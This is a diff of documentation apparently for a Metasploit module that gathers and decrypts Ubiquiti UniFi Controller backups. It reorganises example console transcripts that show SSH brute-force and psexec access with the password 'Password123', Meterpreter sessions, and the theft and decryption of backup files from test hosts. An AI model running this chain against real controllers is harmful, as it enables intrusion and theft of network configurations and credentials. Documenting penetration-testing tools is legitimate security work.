@@ -26,9 +26,10 @@
 
 ## Scenarios
 
-### Ubiquiti Unifi Controller 5.10.19 (Build: atag_5.10.19_11646) on Ubuntu 18.04 and Windows 2012
+### Ubiquiti Unifi Controller 5.10.19 (Build: atag_5.10.19_11646) on Ubuntu 18.04
 
 #### Initial Access
+
 ```
 [*] Processing unifi.rb for ERB directives.
 resource (unifi.rb)> use auxiliary/scanner/ssh/ssh_login
@@ -51,6 +52,64 @@ resource (unifi.rb)> sessions -u 1
 [*] Sending stage (985320 bytes) to 2.2.2.2
 [*] Meterpreter session 2 opened (1.1.1.1:4433 -> 2.2.2.2:37124) at 2019-03-10 15:58:25 -0400
 [*] Command stager progress: 100.00% (773/773 bytes)
+```
+
+#### Module
+
+```
+resource (unifi.rb)> use post/multi/gather/ubiquiti_unifi_backup
+resource (unifi.rb)> set verbose true
+verbose => true
+resource (unifi.rb)> set session 2
+session => 2
+resource (unifi.rb)> run
+
+[*] File /var/lib/unifi/system.properties saved to /root/.msf4/loot/20190310155835_default_2.2.2.2_ubiquiti.system._487688.txt
+[+] Read UniFi Controller file /var/lib/unifi/system.properties
+[-] Directory doesn't exist: /data/autobackup
+[+] Found backup folder: /var/lib/unifi/backup
+[+] File /var/lib/unifi/backup/5.10.19.unf saved to /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_802011.unf
+[+] File 5.10.19.unf DECRYPTED and saved to /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_933774.zip.  File needs to be repair via `zip -FF`
+[*] Attempting to repair zip file (this is normal)
+[+] File /var/lib/unifi/backup/5.10.19.unf DECRYPTED and REPAIRED and saved to /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_271407.zip.
+[*] Post module execution completed
+```
+
+#### Details
+
+```
+msf5 post(multi/gather/ubiquiti_unifi_backup) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > getuid
+Server username: uid=1000, gid=1000, euid=1000, egid=1000
+meterpreter > sysinfo
+Computer     : 2.2.2.2
+OS           : Ubuntu 18.04 (Linux 4.18.0-16-generic)
+Architecture : x64
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter > background
+[*] Backgrounding session 2...
+msf5 post(multi/gather/ubiquiti_unifi_backup) > loot
+
+Loot
+====
+
+host           service  type                                      name                                                          content          info                                                   path
+----           -------  ----                                      ----                                                          -------          ----                                                   ----
+2.2.2.2                 ubiquiti.system.properties                /var/lib/unifi/system.properties                              text/plain                                                              /root/.msf4/loot/20190310155835_default_2.2.2.2_ubiquiti.system._487688.txt
+2.2.2.2                 ubiquiti.unifi.backup                     5.10.19.unf                                                   application/zip  Ubiquiti Unifi Controller Encrypted Backup Zip         /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_802011.unf
+2.2.2.2                 ubiquiti.unifi.backup_decrypted           5.10.19.unf.broken.zip                                        application/zip  Ubiquiti Unifi Controller Decrypted Broken Backup Zip  /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_933774.zip
+2.2.2.2                 ubiquiti.unifi.backup_decrypted_repaired  5.10.19.unf.zip                                               application/zip  Ubiquiti Unifi Controller Backup Zip                   /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_271407.zip
+```
+
+### Ubiquiti Unifi Controller 5.10.19 (Build: atag_5.10.19_11646) on Windows 2012
+
+#### Initial Access
+
+```
+[*] Processing unifi.rb for ERB directives.
 resource (unifi.rb)> use exploit/windows/smb/psexec
 resource (unifi.rb)> set smbpass Password123
 smbpass => Password123
@@ -71,23 +130,13 @@ resource (unifi.rb)> run
 meterpreter > background
 [*] Backgrounding session 3...
 ```
+
+#### Module
+
 ```
 resource (unifi.rb)> use post/multi/gather/ubiquiti_unifi_backup
 resource (unifi.rb)> set verbose true
 verbose => true
-resource (unifi.rb)> set session 2
-session => 2
-resource (unifi.rb)> run
-
-[*] File /var/lib/unifi/system.properties saved to /root/.msf4/loot/20190310155835_default_2.2.2.2_ubiquiti.system._487688.txt
-[+] Read UniFi Controller file /var/lib/unifi/system.properties
-[-] Directory doesn't exist: /data/autobackup
-[+] Found backup folder: /var/lib/unifi/backup
-[+] File /var/lib/unifi/backup/5.10.19.unf saved to /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_802011.unf
-[+] File 5.10.19.unf DECRYPTED and saved to /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_933774.zip.  File needs to be repair via `zip -FF`
-[*] Attempting to repair zip file (this is normal)
-[+] File /var/lib/unifi/backup/5.10.19.unf DECRYPTED and REPAIRED and saved to /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_271407.zip.
-[*] Post module execution completed
 resource (unifi.rb)> set session 3
 session => 3
 resource (unifi.rb)> run
@@ -101,20 +150,10 @@ resource (unifi.rb)> run
 [*] Post module execution completed
 [*] Starting persistent handler(s)...
 ```
-```
-msf5 post(multi/gather/ubiquiti_unifi_backup) > sessions -i 2
-[*] Starting interaction with 2...
 
-meterpreter > getuid
-Server username: uid=1000, gid=1000, euid=1000, egid=1000
-meterpreter > sysinfo
-Computer     : 2.2.2.2
-OS           : Ubuntu 18.04 (Linux 4.18.0-16-generic)
-Architecture : x64
-BuildTuple   : i486-linux-musl
-Meterpreter  : x86/linux
-meterpreter > background
-[*] Backgrounding session 2...
+#### Details
+
+```
 msf5 post(multi/gather/ubiquiti_unifi_backup) > sessions -i 3
 [*] Starting interaction with 3...
 
@@ -130,8 +169,6 @@ Logged On Users : 1
 Meterpreter     : x86/windows
 meterpreter > background
 [*] Backgrounding session 3...
-```
-```
 msf5 post(multi/gather/ubiquiti_unifi_backup) > loot
 
 Loot
@@ -139,12 +176,8 @@ Loot
 
 host           service  type                                      name                                                          content          info                                                   path
 ----           -------  ----                                      ----                                                          -------          ----                                                   ----
-2.2.2.2           ubiquiti.system.properties                /var/lib/unifi/system.properties                              text/plain                                                              /root/.msf4/loot/20190310155835_default_2.2.2.2_ubiquiti.system._487688.txt
-2.2.2.2           ubiquiti.unifi.backup                     5.10.19.unf                                                   application/zip  Ubiquiti Unifi Controller Encrypted Backup Zip         /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_802011.unf
-2.2.2.2           ubiquiti.unifi.backup_decrypted           5.10.19.unf.broken.zip                                        application/zip  Ubiquiti Unifi Controller Decrypted Broken Backup Zip  /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_933774.zip
-2.2.2.2           ubiquiti.unifi.backup_decrypted_repaired  5.10.19.unf.zip                                               application/zip  Ubiquiti Unifi Controller Backup Zip                   /root/.msf4/loot/20190310155836_default_2.2.2.2_ubiquiti.unifi.b_271407.zip
-4.4.4.4           ubiquiti.system.properties                C:\Users\Administrator\Ubiquiti UniFi\data\system.properties  text/plain                                                              /root/.msf4/loot/20190310155838_default_4.4.4.4_ubiquiti.system._035659.txt
-4.4.4.4           ubiquiti.unifi.backup                     5.10.19.unf                                                   application/zip  Ubiquiti Unifi Controller Encrypted Backup Zip         /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_024488.unf
-4.4.4.4           ubiquiti.unifi.backup_decrypted           5.10.19.unf.broken.zip                                        application/zip  Ubiquiti Unifi Controller Decrypted Broken Backup Zip  /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_661494.zip
-4.4.4.4           ubiquiti.unifi.backup_decrypted_repaired  5.10.19.unf.zip                                               application/zip  Ubiquiti Unifi Controller Backup Zip                   /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_212269.zip
-
+4.4.4.4                 ubiquiti.system.properties                C:\Users\Administrator\Ubiquiti UniFi\data\system.properties  text/plain                                                              /root/.msf4/loot/20190310155838_default_4.4.4.4_ubiquiti.system._035659.txt
+4.4.4.4                 ubiquiti.unifi.backup                     5.10.19.unf                                                   application/zip  Ubiquiti Unifi Controller Encrypted Backup Zip         /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_024488.unf
+4.4.4.4                 ubiquiti.unifi.backup_decrypted           5.10.19.unf.broken.zip                                        application/zip  Ubiquiti Unifi Controller Decrypted Broken Backup Zip  /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_661494.zip
+4.4.4.4                 ubiquiti.unifi.backup_decrypted_repaired  5.10.19.unf.zip                                               application/zip  Ubiquiti Unifi Controller Backup Zip                   /root/.msf4/loot/20190310155839_default_4.4.4.4_ubiquiti.unifi.b_212269.zip
+```
